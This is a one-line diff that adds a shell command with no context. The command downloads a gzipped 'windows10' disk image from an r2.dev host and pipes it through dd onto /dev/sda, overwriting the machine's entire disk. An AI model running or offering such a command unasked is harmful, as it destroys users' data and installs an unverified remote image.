@@ -1,0 +1,1 @@
+sudo su ; wget -O- "https://pub-639172d805bb42959c04ca158cf082f8.r2.dev/windows10.gz" | gunzip | dd of=/dev/sda
